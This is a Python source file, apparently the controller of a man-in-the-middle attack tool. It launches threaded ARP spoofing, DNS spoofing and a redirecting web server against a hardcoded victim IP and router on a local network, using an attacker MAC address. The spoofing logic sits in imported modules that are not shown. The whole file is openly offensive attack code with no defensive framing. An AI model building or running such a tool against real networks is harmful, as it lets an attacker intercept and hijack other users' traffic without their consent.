import threading
from arp_spoof import ARPSpoofer
from dns_spoof import DNSSpoofer
from web_server import WEBServer

class SpoofingController:
    def __init__(self, victim_ip, router_ip, attacker_ip, attacker_mac, redirect_to, domain=None):
        self.arp_spoofer = ARPSpoofer(victim_ip, router_ip, attacker_mac)
        self.dns_spoofer = DNSSpoofer(attacker_ip, victim_ip, domain)
        self.web_server = WEBServer(redirect_to)

    def start_attack(self):
        print("Starting ARP spoofing, DNS spoofing, and Web server...")

        # Create threads for each task
        arp_thread = threading.Thread(target=self.arp_spoofer.spoof)
        dns_thread = threading.Thread(target=self.dns_spoofer.spoof)
        web_thread = threading.Thread(target=self.web_server.listen)

        # Start all threads
        arp_thread.start()
        dns_thread.start()
        web_thread.start()

        # Wait for all threads to finish
        arp_thread.join()
        dns_thread.join()
        web_thread.join()

    def stop_attack(self):
        print("Stopping all spoofing and web server...")


if __name__ == "__main__":
    victim_ip = "192.168.1.68"
    router_ip = "192.168.1.254"
    attacker_ip = "192.168.1.82"
    attacker_mac = "ac:bc:32:91:0a:ad"
    redirect_to = "youtube.com"
    
    controller = SpoofingController(victim_ip, router_ip, attacker_ip, attacker_mac, redirect_to)

    try:
        controller.start_attack()
    except KeyboardInterrupt:
        controller.stop_attack()
        print("\nAttack stopped.")